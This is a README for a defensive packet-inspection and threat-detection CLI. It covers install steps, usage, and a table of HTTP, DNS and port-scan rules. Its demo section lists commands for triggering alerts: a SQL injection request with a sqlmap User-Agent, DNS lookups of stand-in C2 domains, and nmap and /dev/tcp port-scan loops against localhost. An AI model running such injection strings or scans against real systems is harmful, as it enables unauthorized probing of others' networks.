# NetSentinel-DPI

> **Portfolio-grade Deep Packet Inspection CLI** — capture, parse, detect, and report network threats.

```
███╗   ██╗███████╗████████╗███████╗███████╗███╗   ██╗████████╗██╗███╗   ██╗███████╗██╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔════╝████╗  ██║╚══██╔══╝██║████╗  ██║██╔════╝██║
██╔██╗ ██║█████╗     ██║   ███████╗█████╗  ██╔██╗ ██║   ██║   ██║██╔██╗ ██║█████╗  ██║
██║╚██╗██║██╔══╝     ██║   ╚════██║██╔══╝  ██║╚██╗██║   ██║   ██║██║╚██╗██║██╔══╝  ██║
██║ ╚████║███████╗   ██║   ███████║███████╗██║ ╚████║   ██║   ██║██║ ╚████║███████╗███████╗
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝
```

[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/)
[![Cross-Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-green.svg)]()
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

---

## Features

| Feature | Status |
|---------|--------|
| PCAP file analysis (offline, no root) | ✅ |
| Live capture (Windows + Linux) | ✅ |
| TCP stream reassembly | ✅ |
| HTTP/1.x parsing (method, URI, headers, body, chunked) | ✅ |
| DNS parsing (QNAME, QTYPE, TTL, TXT) | ✅ |
| TLS ClientHello + JA3 fingerprinting | ✅ |
| YAML-driven rule engine | ✅ |
| Rich terminal dashboard | ✅ |
| JSON export | ✅ |
| HTML incident report | ✅ |
| Multi-threaded live capture pipeline | ✅ |

---

## Architecture

```
Packet Source
    │
    ├── capture/pcap_reader.py     (offline PCAP)
    └── capture/live_capture.py   (live, threaded)
            │
            ▼
    detection/flow_tracker.py     (5-tuple flow tracking, TCP state)
            │
            ├── parser/tcp_reassembly.py  (stream stitching)
            ├── parser/http_parser.py     (HTTP/1.x)
            ├── parser/dns_parser.py      (DNS)
            └── parser/tls_parser.py      (TLS ClientHello + JA3)
            │
            ▼
    detection/engine.py           (YAML rules → Alerts)
            │
            ├── detection/http_detectors.py
            ├── detection/dns_detectors.py
            └── detection/scan_detectors.py
            │
            ▼
    reports/
        ├── dashboard.py    (Rich terminal)
        ├── json_export.py  (JSON)
        └── html_export.py  (HTML incident report)
```

---

## Install on Linux

```bash
# 1. Create and activate a virtual environment
python3 -m venv .venv
source .venv/bin/activate

# 2. Install Python dependencies
pip install -r requirements.txt

# 3. (Live capture only) Ensure libpcap is installed
sudo apt-get install libpcap-dev   # Debian/Ubuntu
# or: sudo dnf install libpcap-devel  (Fedora/RHEL)

# 4. Run offline analysis (no privileges needed)
python cli.py pcap tests/fixtures/mixed_traffic.pcap
```

For **live capture**, run with `sudo` or grant `CAP_NET_RAW`:
```bash
sudo python cli.py live eth0
# or
sudo setcap cap_net_raw,cap_net_admin=eip $(which python3)
python cli.py live eth0
```

---

## Install on Windows

> **⚠ Npcap required** for live capture on Windows.

1. **Install [Npcap](https://npcap.com)** — download and run the installer. Enable the _"WinPcap API-compatible mode"_ option.
2. Open **PowerShell as Administrator** (right-click → "Run as administrator")
3. Create a virtual environment and install:

```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
pip install -r requirements.txt
```

4. Offline analysis (no administrator needed after setup):
```powershell
python cli.py pcap tests\fixtures\mixed_traffic.pcap
```

5. Live capture (**must run as Administrator**):
```powershell
# List interfaces: python -c "from scapy.all import get_if_list; print(get_if_list())"
python cli.py live "Ethernet"
```

---

## Usage

### Analyse a PCAP file (primary demo path)
```bash
python cli.py pcap path/to/capture.pcap

# With JSON and HTML export
python cli.py pcap path/to/capture.pcap --export-json report.json --export-html report.html
```

### Live capture
```bash
# Linux (with sudo or CAP_NET_RAW)
sudo python cli.py live eth0

# Windows (Administrator PowerShell)
python cli.py live "Ethernet"
```

### Stats dashboard
```bash
python cli.py stats --pcap path/to/capture.pcap
```

### Alerts table (filterable)
```bash
# All alerts
python cli.py alerts --pcap path/to/capture.pcap

# Only high-severity alerts
python cli.py alerts --pcap path/to/capture.pcap --severity high
```

### Generate test fixtures
```bash
python tests/fixtures/generate_fixtures.py
```

### Run tests
```bash
pytest tests/ -v
pytest tests/ -v --cov=. --cov-report=term-missing
```

---

## Simulating and Testing Traffic (Demos)

You can evaluate NetSentinel-DPI in two ways: **Offline PCAP replay** (requires no privileges) or **Live Capture simulation** (requires Administrator/root).

### 1. Offline PCAP Simulation (No Privileges)

NetSentinel-DPI comes with built-in scriptable network fixture generation. Generate them by running:
```bash
python tests/fixtures/generate_fixtures.py
```
This generates five PCAP files in `tests/fixtures/`:
* `http_get.pcap`: Standard benign HTTP traffic (no alerts triggered).
* `sqli_attempt.pcap`: SQL injection pattern in the URI query with a `sqlmap` scanner User-Agent.
* `dns_tunnel_burst.pcap`: 60 rapid DNS queries with high-entropy subdomains and TXT response records.
* `port_scan.pcap`: A single source contacting more than 80 destination ports.
* `mixed_traffic.pcap`: A combination of all the above.

Analyze the mixed traffic fixture to see the detection engine in action:
```bash
python cli.py pcap tests/fixtures/mixed_traffic.pcap --export-json report.json --export-html report.html
```

---

### 2. Live Capture Simulation (Privileged)

Start NetSentinel-DPI live on your active interface (e.g., `eth0` on Linux, `"Ethernet"` on Windows):

**Linux / Ubuntu:**
```bash
sudo python cli.py live eth0
```

**Windows (Admin PowerShell):**
```bash
python cli.py live "Ethernet"
```

While NetSentinel-DPI is running, open a **second terminal** to trigger detections using the commands below:

#### A. Trigger HTTP Scanner & SQL Injection Alerts (`HTTP-002`, `HTTP-005`)
Send an HTTP request with a mock exploit payload and scanner User-Agent:
* **Linux/Ubuntu:**
  ```bash
  curl -H "User-Agent: sqlmap/1.8" "http://example.com/login?user=1'+union+select+null--"
  ```
* **Windows (PowerShell):**
  ```powershell
  Invoke-WebRequest -UserAgent "sqlmap/1.8" -Uri "http://example.com/login?user=1'+union+select+null--"
  ```

#### B. Trigger DNS Tunneling & C2 Alerts (`DNS-001`, `DNS-007`)
Generate a DNS query to a known Dynamic DNS service suffix or a high-entropy domain:
* **Linux/Ubuntu:**
  ```bash
  dig malware-c2-testing-domain.duckdns.org
  dig Z3lhbXBsZWJhc2U2NGRhdGE=.c2.attacker.io
  ```
* **Windows (PowerShell/CMD):**
  ```powershell
  Resolve-DnsName -Name "malware-c2-testing-domain.duckdns.org"
  Resolve-DnsName -Name "Z3lhbXBsZWJhc2U2NGRhdGE=.c2.attacker.io"
  ```

#### C. Trigger Port Scan Alert (`SCAN-001`)
Quickly probe a sequence of ports to trigger the horizontal scan detection engine:
* **Linux/Ubuntu (using Nmap or custom loop):**
  ```bash
  nmap -sS -F 127.0.0.1
  # OR using a quick bash TCP loop:
  for port in {20..50}; do (timeout 0.1 bash -c "echo >/dev/tcp/127.0.0.1/$port") 2>/dev/null; done
  ```
* **Windows (PowerShell socket loop):**
  ```powershell
  20..50 | ForEach-Object {
      $client = New-Object System.Net.Sockets.TcpClient
      $async = $client.BeginConnect("127.0.0.1", $_, $null, $null)
      $wait = $async.AsyncWaitHandle.WaitOne(50)
      if ($client.Connected) { $client.Close() }
  }
  ```

---

## Detection Coverage

| Rule ID | Name | Severity | MITRE |
|---------|------|----------|-------|
| HTTP-001 | Suspicious HTTP Method | Medium | T1071.001 |
| HTTP-002 | SQL Injection Attempt | High | T1190 |
| HTTP-003 | XSS Attack Pattern | High | T1059.007 |
| HTTP-004 | Directory Traversal | High | T1083 |
| HTTP-005 | Scanner/Tool User-Agent | Medium | T1595.002 |
| HTTP-006 | Empty/Missing User-Agent | Low | T1071.001 |
| HTTP-007 | Large Payload Upload | Medium | T1105 |
| HTTP-008 | SQL Injection in Body | High | T1190 |
| HTTP-009 | RFI/LFI Attempt | High | T1190 |
| HTTP-010 | Command Injection | Critical | T1059 |
| DNS-001 | High-Entropy QNAME (tunneling) | High | T1071.004 |
| DNS-002 | Long QNAME (tunneling) | High | T1071.004 |
| DNS-003 | Excessive TXT Records | High | T1071.004 |
| DNS-004 | High DNS Query Rate | Medium | T1071.004 |
| DNS-005 | .onion Domain Query | Medium | T1090.003 |
| DNS-006 | DGA-like Domain Pattern | Medium | T1568.002 |
| DNS-007 | Known C2 DDNS Pattern | Critical | T1071.004 |
| DNS-008 | DNS Rebinding Pattern | High | T1557 |
| SCAN-001 | Port Scan | High | T1046 |

---

## Known Limitations vs. Production DPI (Zeek/Suricata)

| Limitation | Detail |
|------------|--------|
| **No TLS decryption** | TLS ClientHello metadata and JA3 fingerprints only; payload is opaque |
| **No HTTP/2 or HTTP/3** | Only HTTP/1.x parsed from TCP streams |
| **TCP seq wraparound (PAWS)** | 32-bit sequence number wraparound edge cases not handled |
| **No protocol state emulation** | No stateful FTP/SMTP/SMB tracking |
| **No IPS/blocking** | Detection only — no packet modification or dropping |
| **No multi-core scaling** | Single capture thread feeds single detection thread |
| **No PCRE-compatible regex** | Python `re` module (no lookahead groups like Suricata) |
| **No IPv6 fragmentation** | IPv6 extension headers not parsed |
| **No hardware offload** | No DPDK, AF_XDP, or PF_RING support |
| **Rule persistence** | No SQLite session storage across runs (in-memory only) |

---

## Cross-Platform Compatibility

- ✅ **No OS-specific shell-outs** — all capture via scapy (`sniff()`/`rdpcap()`)
- ✅ **No hardcoded path separators** — `pathlib.Path` used everywhere
- ✅ **No POSIX-only calls** — no `fcntl`, `os.fork`, `resource`, etc.
- ✅ **Threading** via stdlib `threading` (works identically on Windows and Linux)
- ✅ **Live capture errors** produce platform-specific guidance messages

---

## License

MIT © 2026 NetSentinel-DPI
